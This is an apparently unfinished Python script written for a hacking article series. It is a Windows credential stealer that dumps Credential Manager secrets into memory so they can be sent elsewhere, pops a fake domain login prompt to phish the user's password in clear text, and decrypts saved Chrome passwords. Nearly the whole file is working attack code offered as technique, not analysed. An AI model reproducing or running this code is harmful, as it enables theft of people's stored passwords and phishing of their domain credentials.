# WORK IN PROGRESS
# FOR PART 3 OF 0X00SEC ARTICLES SERIES

import os
import io
import sys
import sqlite3
import json
import csv
import win32cred
import win32crypt
import pywintypes

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC

def dump_credsman():
    """
    Only dumps credentials that are not domain-type.

    https://docs.microsoft.com/en-us/windows/desktop/api/wincred/ns-wincred-_credentiala

    Secret data for the credential. The CredentialBlob member can be both read and written.

    If the Type member is CRED_TYPE_DOMAIN_PASSWORD, this member contains the plaintext Unicode 
    password for UserName. The CredentialBlob and CredentialBlobSize members do not include a 
    trailing zero character. Also, for CRED_TYPE_DOMAIN_PASSWORD, this member can only be read 
    by the authentication packages.
    """
    CredEnumerate = win32cred.CredEnumerate
    CredRead = win32cred.CredRead

    try:
        creds = CredEnumerate(None, 0)
    except Exception as e:
        print(e)

    # Using an array instead of a dictionary to append data
    # as literal string because of issues with the passwords
    # decoding with JSON.

    credentials = []

    max_count = len(creds)

    for package in creds:
        try:
            target = package['TargetName']
            creds = CredRead(target, CRED_TYPE_GENERIC)
            credentials.append(creds)
        except pywintypes.error:
            pass

    # Write credentials in a file in memory to avoid writing on disk.
    # Can be sent anywhere after.

    cred_file = io.StringIO()

    for cred in credentials:

        service = cred['TargetName']
        username = cred['UserName']
        password = cred['CredentialBlob'].decode()

        cred_file.write('Service: ' + str(service) + '\n')
        cred_file.write('Username: ' + str(username) + '\n')
        cred_file.write('Password: ' + str(password) + '\n')
        cred_file.write('\n')

    return cred_file.getvalue()

def prompt_for_domain_creds():
    """
    Prompt the user for entering his domain credentials using the 'userdomain'
    environment variable. If user is on domain 'CONTOSO.ORG' then it will ask
    prompt for authentication on 'CONTOSO-ORG'. It then returns the password
    in clear text.

    You don't need that fancy LSASS dump with admin privileges to get the
    password hash. You just need to ask for it..
    """

    CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials
    creds = {}
    creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})

    return creds

def dump_chrome_passwords():

    chrome_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\'
    chrome_credentials = {}

    try:
        conn = sqlite3.connect(chrome_data + 'Login Data') # Open Sqlite DB file
        cursor = conn.cursor()                             # Create a cursor to fetch the data
        results = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        data = results.fetchall()

        for url, username, password in data:
            password = win32crypt.CryptUnprotectData(password,
                                                    None,
                                                    None,
                                                    None,
                                                    0)[1]
            if password:
                chrome_credentials.update({url:
                    {'Username': username, 'Password': password}})
    
        return chrome_credentials

    except Exception as e:
        print(e)
        pass

print(dump_chrome_passwords())


# CredReadDomainCredentialsA?
